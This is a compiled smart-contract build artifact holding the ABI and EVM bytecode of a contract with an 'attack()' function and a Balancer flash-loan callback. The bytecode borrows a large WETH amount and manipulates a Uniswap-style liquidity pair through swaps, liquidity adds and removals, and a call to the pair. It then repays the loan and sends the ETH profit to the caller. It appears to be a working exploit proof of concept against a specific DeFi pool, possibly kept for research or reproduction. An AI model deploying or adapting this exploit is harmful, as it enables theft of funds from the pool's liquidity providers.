{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"receiveFlashLoan","inputs":[{"name":"","type":"address[]","internalType":"contract IERC20[]"},{"name":"","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f19602482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc29063095ea7b3906044016020604051808303815f875af11580156077573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019060999190609e565b5060c2565b5f6020828403121560ad575f5ffd5b8151801515811460bb575f5ffd5b9392505050565b610fd2806100cf5f395ff3fe60806040526004361061002b575f3560e01c80639e5faafc14610036578063f04f27071461004c575f5ffd5b3661003257005b5f5ffd5b348015610041575f5ffd5b5061004a61006b565b005b348015610057575f5ffd5b5061004a610066366004610c9c565b6103c9565b5f73b292678438245ec863f9fea64affcea8871442406001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100bc573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100e09190610db5565b60405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f1960248201529091506001600160a01b0382169063095ea7b3906044016020604051808303815f875af1158015610141573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101659190610dd7565b506040805160018082528183019092525f91602080830190803683370190505090505f516020610f7d5f395f51905f52815f815181106101a7576101a7610df6565b6001600160a01b0392909216602092830291909101909101526040805160018082528183019092525f9181602001602082028036833701905050905069065a4da25d3016c00000815f8151811061020057610200610df6565b6020908102919091010152604051632e1c224f60e11b815273ba12222222228d8ba445958a75a0704d566bf2c890635c38449e9061024690309086908690600401610e4d565b5f604051808303815f87803b15801561025d575f5ffd5b505af115801561026f573d5f5f3e3d5ffd5b50506040516370a0823160e01b81523060048201525f92505f516020610f7d5f395f51905f5291506370a0823190602401602060405180830381865afa1580156102bb573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102df9190610edd565b604051632e1a7d4d60e01b8152600481018290529091505f516020610f7d5f395f51905f5290632e1a7d4d906024015f604051808303815f87803b158015610325575f5ffd5b505af1158015610337573d5f5f3e3d5ffd5b50506040515f925033915083908381818185875af1925050503d805f811461037a576040519150601f19603f3d011682016040523d82523d5f602084013e61037f565b606091505b50509050806103c25760405162461bcd60e51b815260206004820152600b60248201526a4e6f74207375636365737360a81b604482015260640160405180910390fd5b5050505050565b5f73b292678438245ec863f9fea64affcea8871442406001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561041a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061043e9190610db5565b6040516370a0823160e01b81523060048201529091505f905f516020610f7d5f395f51905f52906370a0823190602401602060405180830381865afa158015610489573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104ad9190610edd565b6040516370a0823160e01b815273b292678438245ec863f9fea64affcea88714424060048201529091505f905f516020610f7d5f395f51905f52906370a0823190602401602060405180830381865afa15801561050c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105309190610edd565b6040805160028082526060820183529293505f9290916020830190803683370190505090505f516020610f7d5f395f51905f52815f8151811061057557610575610df6565b60200260200101906001600160a01b031690816001600160a01b03168152505083816001815181106105a9576105a9610df6565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d90635c11d7959061060b90690270d6d748119f3cfb08905f90869030905f1990600401610ef4565b5f604051808303815f87803b158015610622575f5ffd5b505af1158015610634573d5f5f3e3d5ffd5b50506040516370a0823160e01b81523060048201525f92506001600160a01b03871691506370a0823190602401602060405180830381865afa15801561067c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106a09190610edd565b60405162e8e33760e81b81526001600160a01b03871660048201525f516020610f7d5f395f51905f52602482015260448101829052690270d6d748119f3cfb0860648201525f6084820181905260a48201523060c48201525f1960e4820152909150737a250d5630b4cf539739df2c5dacb4c659f2488d9063e8e3370090610104016060604051808303815f875af115801561073e573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107629190610f2f565b505050846001600160a01b03166305c03bc16040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561079d575f5ffd5b505af11580156107af573d5f5f3e3d5ffd5b505060405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f19602482015273b292678438245ec863f9fea64affcea887144240925063095ea7b391506044016020604051808303815f875af115801561081c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108409190610dd7565b506040516370a0823160e01b81523060048201525f9073b292678438245ec863f9fea64affcea887144240906370a0823190602401602060405180830381865afa158015610890573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108b49190610edd565b604051635d5155ef60e11b81526001600160a01b03881660048201525f516020610f7d5f395f51905f526024820152604481018290525f6064820181905260848201523060a48201525f1960c4820152909150737a250d5630b4cf539739df2c5dacb4c659f2488d9063baa2abde9060e40160408051808303815f875af1158015610941573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109659190610f5a565b50506040516370a0823160e01b81523060048201525f906001600160a01b038816906370a0823190602401602060405180830381865afa1580156109ab573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109cf9190610edd565b905086845f815181106109e4576109e4610df6565b60200260200101906001600160a01b031690816001600160a01b0316815250505f516020610f7d5f395f51905f5284600181518110610a2557610a25610df6565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d90635c11d79590610a7d9084905f90899030905f1990600401610ef4565b5f604051808303815f87803b158015610a94575f5ffd5b505af1158015610aa6573d5f5f3e3d5ffd5b505060405163a9059cbb60e01b815273ba12222222228d8ba445958a75a0704d566bf2c8600482015269065a4da25d3016c0000060248201525f516020610f7d5f395f51905f52925063a9059cbb91506044016020604051808303815f875af1158015610b15573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610b399190610dd7565b505050505050505050505050565b634e487b7160e01b5f52604160045260245ffd5b604051601f8201601f1916810167ffffffffffffffff81118282101715610b8457610b84610b47565b604052919050565b5f67ffffffffffffffff821115610ba557610ba5610b47565b5060051b60200190565b6001600160a01b0381168114610bc3575f5ffd5b50565b5f82601f830112610bd5575f5ffd5b8135610be8610be382610b8c565b610b5b565b8082825260208201915060208360051b860101925085831115610c09575f5ffd5b602085015b83811015610c26578035835260209283019201610c0e565b5095945050505050565b5f82601f830112610c3f575f5ffd5b813567ffffffffffffffff811115610c5957610c59610b47565b610c6c601f8201601f1916602001610b5b565b818152846020838601011115610c80575f5ffd5b816020850160208301375f918101602001919091529392505050565b5f5f5f5f60808587031215610caf575f5ffd5b843567ffffffffffffffff811115610cc5575f5ffd5b8501601f81018713610cd5575f5ffd5b8035610ce3610be382610b8c565b8082825260208201915060208360051b850101925089831115610d04575f5ffd5b6020840193505b82841015610d2f578335610d1e81610baf565b825260209384019390910190610d0b565b9650505050602085013567ffffffffffffffff811115610d4d575f5ffd5b610d5987828801610bc6565b935050604085013567ffffffffffffffff811115610d75575f5ffd5b610d8187828801610bc6565b925050606085013567ffffffffffffffff811115610d9d575f5ffd5b610da987828801610c30565b91505092959194509250565b5f60208284031215610dc5575f5ffd5b8151610dd081610baf565b9392505050565b5f60208284031215610de7575f5ffd5b81518015158114610dd0575f5ffd5b634e487b7160e01b5f52603260045260245ffd5b5f8151808452602084019350602083015f5b82811015610e435781516001600160a01b0316865260209586019590910190600101610e1c565b5093949350505050565b6001600160a01b03841681526080602082018190525f90610e7090830185610e0a565b8281036040840152835180825260208086019201905f5b81811015610ea5578351835260209384019390920191600101610e87565b505083810360608501526020815273b292678438245ec863f9fea64affcea88714424060208201526040810192505050949350505050565b5f60208284031215610eed575f5ffd5b5051919050565b85815284602082015260a060408201525f610f1260a0830186610e0a565b6001600160a01b0394909416606083015250608001529392505050565b5f5f5f60608486031215610f41575f5ffd5b5050815160208301516040909301519094929350919050565b5f5f60408385031215610f6b575f5ffd5b50508051602090910151909290915056fe000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a2646970667358221220ed840495c91d85a733db59984abe16287772f5f9c9bf90f19ea2bbe3f994db0364736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","receiveFlashLoan(address[],uint256[],uint256[],bytes)":"f04f2707"},"id":560}